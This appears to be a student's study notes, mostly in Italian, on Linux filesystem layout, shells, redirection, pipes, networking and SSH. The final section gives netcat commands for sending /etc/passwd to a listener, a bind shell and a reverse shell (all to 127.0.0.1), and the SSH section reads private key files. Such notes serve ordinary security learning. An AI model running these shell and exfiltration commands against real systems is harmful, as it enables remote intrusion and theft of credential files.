# Filesystem
Tree structure
- /
	 - /boot/ —> system boot files
	-  /dev/ —> hardware devices (ogni dispositivo è un file)
	-  /etc/ —> system configuration
	-  /home/ —> user home directories
	-  /lib/ —> system libraries
	-  /mnt/ —> removable devices (e.g. usb)
	-  /proc/ —> kernel interaction (file abstraction) 
	-  /sys/ —> kernel interaction
	-  /tmp/ —> temporary files
	-  /usr/ —> universal system resources/mostly user installed programs
	-  /var/ —> variable files
## tty
	tty = virtual terminal - terminale virtuale
SI tratta dell'interfaccia principale del SO. Provando ad installare Linux senza interfaccia grafica, si avrà la tty. Viene definita "virtuale" poiché è una versione virtuale dei vecchi telescriventi.
>[!info]- tty = text input/output interface provided by the kernel

I file tty si trovano in `/dev`.
## La shell e i file descriptors
>[!note]- Shell = command line interpreter
>input → shell → output

Esistono 3 file di default ( con i corrispettivi file descriptors) con cui lavora la shell:
- 0 - stdin
- 1 - stdout
- 2 - stderr
In un terminale virtuale, di default:
- fd 0 è connesso alla tastiera
- fd 1 e 2 sono connessi allo schermo
### GUI
>[!info]- GUI = Graphical User Interface

Si tratta di:
- Finestre, Icone, Puntatore del mouse
- Interfacce User-friendly per il SO
- Si esegue al di sopra del tty
- Permette uno pseudo-tty grazie a programmi chiamati *emulatori di terminale*
# Shell
La Shell può essere utilizzata in due modi:
- Interattivamente
- Eseguendo un file scritto in "linguaggio shell"
Ci sono molti programmi che implementano una shell ( sh, bash, zsh, ...)
Una shell accoglie l'utente con un prompt.
- La shell è pronta ad accettare comandi da eseguire
- Il prompt è qualsiasi cosa viene scritta alla shell
	- Un programma da eseguire
	- Un comando shell
La shell utilizza le variabili d'ambiente:
- Variabili globali a livello di sistema operativo che configurano l'ambiente di sistema (ad esempio $PATH)
- Variabili globali di runtime che definiscono l'ambiente locale (ad esempio $USER, $TERM)
>[!important]- Il programma `echo`
> - Riscrive qualsiasi cosa trova come argomento di linea di comando
> - Gli argomenti della linea di comando sono stringhe che seguono il nome del programma, separato da spazi
> - Può essere anche utilizzato per stampare variabili d'ambiente
> 	- `echo $PATH`

>[!important]- Il programma `pwd`
>- Stampa la cartella di lavoro corrente
>- Si cambia directory con `cd`
>- Si ottiene una lista dei file/cartelle dentro una directory con `ls`

>[!important]- Il programma `cat`
>`cat file.txt`
>Stampa il contenuto di un file

>[!info]- Editor CLI
>- nano
>- vim
>- ...

## Redirection
L'input e l'Output di un programma può essere reindirizzato e dato in pasto ad altri programmi:
- L'operatore ">" reindirizza l'*output*;
- L'operatore "<" reindirizza l'*input*.
La sintassi generale per il reindirizzamento è:
- `fd1 [operator] &fd2 ->` reindirizza fd1 a fd2
- `fd1 [operator] filename ->` reindirizza f1 al filename
Il file speciale `/dev/null`
- I byte scritti su questo file sono semplicemente spazzatura
- Utile per quando si vuole ignorare un output
- `find / -type f -name sudo 2>/dev/null`
	- = ignora stderr e stampa solo stdout
## Pipes
Le pipes sono file utilizzati dei processi per intercomunicare (IPC).
- Una *named pipe* o *fifo* esiste nel filesystem;
- Una *anonymous pipe* è gestita direttamente dal kernel e non esiste nel filesystem.
Supponi di voler utilizzare l'output di un programma come input di un'altro. Puoi farlo con i reindirizzamenti, oppure con le pipe:
```Bash
program1 | program2
program1 | program2 | program 3 | ...
```

Le pipe necessitano di essere create prima di essere utilizzate.

>[!important]- Il programma `grep`
> Il programma `grep` filtra l'input in base a delle regole.
> es. `cat *.txt | grep "vdsi"` mostrerà in output qualsiasi file .txt che contiene la stringa "vdsi"

Altri programmi di filtro di testo:
- `awk` estrae token
- `sed` rimpiazza stringhe
- `cut` taglia le stringhe e ne prende solo alcune parti
### Stringhe
Le stringhe sono sequenze di caratteri racchiuse tra virgolette.
>[!info]- `\` è una Escape sequence
>Una stringa è "escaped" quando tutti i caratteri pericolosi vengono rimpiazzati da sequenze di fuga.
>

### Text Editors
Spesso avrai bisogno di modificare dei file direttamente dalla shell. Ci sono due programmi principali di editing di testo:
- Nano
- Vim (e derivati, es. neovim, lunarvim, lazivim, vi, ...)
# File e processi
## Permessi in linux
![[Pasted image 20240315232541.png|center|500]]
## Networking
```Bash
netstat
ip addr
ip route
ip neigh
ip link
ifconfig
route -n
```
### SSH
```Bash
service ssh status/start
ssh-keygen -t rsa
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
ssh -i id root@127.0.0.1 -p 53
```
# Scripting, bind e Reverse shell
## Netcat
### Transferring files
```Zsh
nc -lvnp 1234
cat /etc/passwd | nc 127.0.0.1 1234
nc -lvnp 1234 > transfered
cat /etc/passwd | nc -w1 127.0.0.1 1234
```
### Bind shell
![[Pasted image 20240315233334.png|center|500]]

```zsh
(shell 1) nc -lvnp 1234 -e /bin/bash
(shell 2) nc 127.0.0.1 1234
```
### Reverse Shell
![[Pasted image 20240315233613.png|center|500]]
```zsh
(shell 1) nc -lvnp 1234 
(shell 2) nc 127.0.0.1 1234 -e /bin/bash
```